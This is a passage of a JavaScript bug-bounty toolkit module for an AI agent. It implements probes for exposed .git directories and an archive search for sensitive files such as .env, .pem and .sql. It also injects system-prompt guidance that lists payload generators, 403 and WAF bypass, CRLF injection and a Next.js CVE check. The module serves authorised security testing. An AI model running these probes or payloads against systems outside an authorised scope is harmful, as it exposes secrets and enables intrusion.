			render: (_args, v) =>
				renderLines("🔓 bb_git_exposure " + v.url, [
					v.summary,
					...(v.findings.length ? v.findings : ["no .git exposure detected"]),
					"probes: " + v.checks.map((c) => `${c.path} -> ${c.status}${c.marker ? " (" + c.marker + ")" : ""}`).join(" | ")
				])
		},
		timeoutMs: 25000,
		isConcurrencySafe: () => true,
		async execute(args, exec) {
			const out = { url: String(args.url || ""), checks: [], findings: [], summary: "", error: "" };
			try {
				const base = normalizeUrl(args.url).replace(/\/+$/, "");
				const probes = [
					["/.git/HEAD", "ref:"],
					["/.git/config", "[core]"],
					["/.git/index", "DIRC"],
					["/.git/logs/HEAD", "0000000"],
					["/.git/refs/heads/main", "ref:"]
				];
				for (const [p, marker] of probes) {
					let status = 0;
					let body = "";
					try {
						const { res } = await fetchRes(base + p, exec, { budget: 8000 });
						status = res.status;
						body = await readLimited(res, 400);
					} catch {
						status = 0;
					}
					const hit = status === 200 && marker && body.includes(marker);
					out.checks.push({ path: p, status, marker: hit ? marker : "" });
					if (hit) out.findings.push(`${p} readable (200, contains "${marker}") — .git repository exposed`);
				}
				let listStatus = 0;
				let listBody = "";
				try {
					const { res } = await fetchRes(base + "/.git/", exec, { budget: 8000 });
					listStatus = res.status;
					listBody = await readLimited(res, 300);
				} catch {
					listStatus = 0;
				}
				const listing = /index of|directory listing/i.test(listBody);
				out.checks.push({ path: "/.git/", status: listStatus, marker: listing ? "Index of" : "" });
				if (listing) out.findings.push("/.git/ returns an index listing — dump with git-dumper");
				out.summary = out.findings.length
					? `${out.findings.length} exposure sign(s) — ${out.findings[0]}`
					: "no .git exposure detected";
			} catch (e) {
				out.error = shortErr(e);
			}
			return out;
		}
	},
	{
		name: "bb_sensitive_files",
		description: "Mine archived URLs (Wayback CDX) for sensitive file extensions: configs, archives, key material, DB dumps, backups, env files and source bundles; grouped by extension. Keyless: CDX API.",
		parameters: {
			type: "object",
			additionalProperties: false,
			properties: {
				domain: { type: "string", description: "Domain to mine, e.g. example.com" },
				limit: { type: "integer", description: "Max URLs to return (default 60)" }
			},
			required: ["domain"]
		},
		output: {
			schema: {
				type: "object",
				properties: {
					domain: { type: "string" },
					matches: { type: "array", items: { type: "string" } },
					by_extension: { type: "object", additionalProperties: true },
					summary: { type: "string" },
					error: { type: "string" }
				},
				required: ["domain", "matches", "by_extension", "summary"]
			},
			render: (_args, v) =>
				renderLines("📁 bb_sensitive_files " + v.domain, [
					v.summary,
					...(v.matches.length ? v.matches : ["no sensitive files found in archives"]),
					"by extension: " + Object.entries(v.by_extension).map(([e, n]) => e + "=" + n).join(" ")
				])
		},
		timeoutMs: 45000,
		isConcurrencySafe: () => true,
		async execute(args, exec) {
			const domain = normalizeDomain(args.domain);
			const limit = Math.min(Math.max(Number(args.limit) || 60, 1), 200);
			const out = { domain, matches: [], by_extension: {}, summary: "", error: "" };
			try {
				const { urls, error } = await cdxUrls(domain, exec, { cap: 800 });
				if (error) out.error = error;
				const EXTS = ["xls", "xml", "json", "pdf", "sql", "doc", "docx", "pptx", "txt", "zip", "tar.gz", "tgz", "bak", "ost", "wim", "rar", "7z", "reg", "db", "jar", "war", "git", "gitignore", "py", "csv", "rtf", "env", "log", "lock", "key", "p12", "pem", "der", "csr", "conf", "cfg", "ini", "sqlite", "sqlcipher", "apk", "apkg", "whl", "deb", "rpm", "msi", "exe", "dll", "so", "sh", "mmdb", "accdb", "sqlite3", "db3", "dat", "bin", "hex", "backup"];
				const re = new RegExp("\\.(" + EXTS.map((e) => e.replace(/\./g, "\\.")).join("|") + ")([?#].*)?$", "i");
				const seen = new Set();
				for (const u of urls) {
					let path;
					try {
						path = new URL(u).pathname;
					} catch {
						continue;
					}
					if (!re.test(path)) continue;
					const clean = u.split(/[?#]/)[0];
					if (seen.has(clean)) continue;
					seen.add(clean);
					out.matches.push(clean);
					const ext = (path.match(/\.([a-z0-9]+)$/i) || [])[1] || "?";
					out.by_extension[ext] = (out.by_extension[ext] || 0) + 1;
				}
				out.matches = out.matches.slice(0, limit);
				const exts = Object.entries(out.by_extension).sort((a, b) => b[1] - a[1]).map(([e, n]) => e + "x" + n).join(", ");
				out.summary = out.matches.length
					? `${out.matches.length} sensitive file(s) from ${urls.length} archived URLs (${exts})`
					: `no sensitive files in ${urls.length} archived URLs`;
			} catch (e) {
				out.error = shortErr(e);
			}
			return out;
		}
	}
];

const GUIDANCE = [
	"BUG BOUNTY RECON & FINDING TOOLKIT (dsh-bugbounty, keyless sources):",
	"- bb_enum_subdomains(domain) — passive subdomain enumeration (crt.sh CT logs + HackerTarget) for the recon research phase.",
	"- bb_probe_http(host, ports?) — fast HTTP(S) liveness probe: status, final URL, <title>, Server banner, per-port errors.",
	"- bb_security_headers(url) — audit security headers (CSP/HSTS/XFO/XCTO/Referrer/Permissions/COOP/CORP/COEP), server leak headers, and cookie flags (Secure/HttpOnly/SameSite).",
	"- bb_tech_detect(url) — fingerprint the tech stack from headers, cookies and HTML (WordPress, Next.js, Nuxt, Drupal, Joomla, React, jQuery, nginx, IIS, Cloudflare, ...).",
	"- bb_wayback_urls(domain, limit?) — archived URLs from the Wayback CDX API; flags interesting endpoints/params (id, file, redirect, token, auth, download, cmd, admin, api, .env, .git, swagger, graphql).",
	"- bb_recon(domain) — one-shot pipeline: enum -> probe -> tech detect -> header audit; returns live hosts + findings (missing headers, leaks, cookie flags, http-only hosts).",
	"- bb_checklist(category?) — web/API bug-bounty methodology checklist (45 categories: recon, IDOR/BAC, SSRF, auth, XSS, SQLi, business logic, API misconfig, subdomain takeover, CSRF/open redirect, file upload, engagement, reporting, registration-flows, actuator, js-recon, origin-ip, crlf-injection, host-header, rate-limit, 403-bypass, email-field, mass-assignment, punycode-idn, blind-xss, waf-bypass, framework-cves, github-recon, iis-fuzzing, nuclei-dast, s3-recon, swagger-api, wayback-mining, fuzz-pipeline, sqli-recon, open-redirect, cache-deception, wordpress, ct-monitor, url-collection, sensitive-data, lfi, cors, google-dorks). Unfiltered = compact index; pass a slug/name (e.g. \"ssrf\", \"api\") for full checks + techniques.",
	"- bb_actuator_scan(url) — probe Spring Boot Actuator endpoints (/actuator/env, /heapdump, /jolokia, ...) for exposed internals, high-risk hits and default config.",
	"- bb_js_secrets(domain, limit?) — mine archived JS bundles from the Wayback CDX API for leaked secrets (AWS keys, Google API keys, JWTs, generic key/secret pairs).",
	"- bb_403_bypass(url) — try HTTP method flips, routing headers (X-Original-URL, X-Forwarded-For, X-Real-IP) and path mutations (/./, /%2e/, ;, %00, ..;/ etc) against a 403.",
	"- bb_origin_ip(domain) — hunt the real origin IP: parse SPF TXT records (ip4/ip6/include) and scan OTX host findings for the origin server.",
	"- bb_crlf_scan(url) — test CRLF/header-injection payloads (incl. %00%0d%0a and GBK-encoded) in path/query for set-cookie or injected response headers.",
	"- bb_swagger_scan(domain) — probe common OpenAPI/Swagger endpoints (/swagger-ui.html, /v2/api-docs, /openapi.json, ...) for exposed API docs.",
	"- bb_s3_probe(domain) — generate predictable S3 bucket names from the domain (backup, dev, prod, uploads, ...) and test for open/listable buckets.",
	"- bb_punycode_gen(email, cap?) — generate homograph + punycode lookalike email variants for account-takeover/verification-skip tests.",
	"- bb_mass_assign_gen() — generate mass-assignment payloads (isAdmin, role, org, __proto__, $ne, ...) for API parameter-pollution tests.",
	"- bb_email_payloads(email?) — generate email-field injection payloads (case, +alias, dot, quoted, CRLF, metadata SSRF, SQLi/CMDi, homograph).",
	"- bb_nextjs_cve(url) — check for CVE-2025-29927 middleware bypass via x-middleware-subrequest header replay.",
	"- bb_ct_fresh_assets(domain, limit?) — query crt.sh CT-log JSON for the freshest (most recent not_before) certificates/subdomains.",
	"- bb_wordpress_surf(url) — one-shot WordPress probe: user enumeration via REST API, xmlrpc.php, config backups, debug.log, install/setup wizard.",
	"- bb_cache_deception_scan(domain, limit?) — mine archived account/dashboard URLs and test static-extension suffixes (;.css, /style.css, .png) for cache poisoning/deception.",
	"- bb_sqli_param_hunt(domain, limit?) — correlate Wayback + OTX URLs to rank dynamic endpoints and injection-prone parameter names for SQLi testing.",
	"- bb_waf_fingerprint(url) — fingerprint WAF/CDN from headers (Cloudflare, Akamai, Imperva, AWS, F5, Azure, Sucuri) and suggest sqlmap --tamper hints.",
	"- bb_cors_scan(url) — test cross-origin resource sharing: send evil/null Origins + OPTIONS preflight, detect reflected ACAO, ACAC true, wildcard+credentials and missing Vary: Origin.",
	"- bb_git_exposure(url) — probe for exposed .git: /.git/HEAD, /.git/config, /.git/index, /.git/logs/HEAD, /.git/refs/heads/main plus directory-listing check.",
	"- bb_sensitive_files(domain, limit?) — mine Wayback CDX for sensitive-file extensions (.env, .sql, .bak, .xls, .pem, .gitignore, .tar.gz, ...) grouped by type.",
	"- bb_source_audit(language?) — SEGREGATED source-code audit methodology (C/C++, Rust, Go, JS/TS): 7-step audit flow, bug-class priority order (parsers, memory mgmt, IPC/network, privilege boundaries, error handling, concurrency), per-language checks + grep patterns (memcpy, unsafe, unwrap, unsafe.Pointer, eval, __proto__, ...). Pass a language slug for focused output.",
	"- bb_triage() — Rhat-scored bug triage workflow (bughunt obsidian bug-report template): score candidates with P(real_bug)/P(feasible)/P(reproducible)/P(new_root_cause)/expected_impact -> REPORT / INVESTIGATE / DISCARD; status tracking, finding classes (genuine vs design opinion vs style), SQLite concurrency audit checklist, report template fields.",
	"Workflow: start a target with bb_recon(domain); drill into promising live hosts with bb_security_headers / bb_tech_detect / bb_probe_http; mine bb_wayback_urls for archived endpoints, IDs and params; use web_search for current techniques and bash for active PoCs. All sources are keyless and rate-limited — expect per-source errors and fall back gracefully. Triage every candidate with bb_triage BEFORE reporting (REPORT only high-Rhat: genuine + feasible + reproducible).",
	"Engagement & ops (merged from bughunt rules): verify program scope BEFORE testing, never touch other users' data, report confirmed vulns within 24h. The shell is non-interactive: always use -y/--no-input flags, ssh -o BatchMode=yes, avoid vim/less/man/REPLs, pipe `yes` into anything that may prompt; prefer read/write/glob/grep tools over cat/find/grep."
].join("\n");

export function apply(ctx) {
	if (ctx && ctx.systemPrompt && typeof ctx.systemPrompt.section === "function") {
		ctx.systemPrompt.section({ name: "tool:bugbounty", order: 115, text: GUIDANCE });
	}
	for (const def of TOOLS) {
		ctx.tools.register(def);
	}
}

// ---------------------------------------------------------------------------
// neutral API — same logic callable from non-DSH hosts (e.g. OpenCode adapter)
// Each entry is { name, description, execute } where execute takes plain args
// and returns the SAME structured value the DSH tool would return.
// ---------------------------------------------------------------------------

export const bbApi = Object.fromEntries(
	TOOLS.map((def) => [
		def.name,
		{
			name: def.name,
			description: def.description,
			execute: (args = {}) => def.execute(args)
		}
	])
);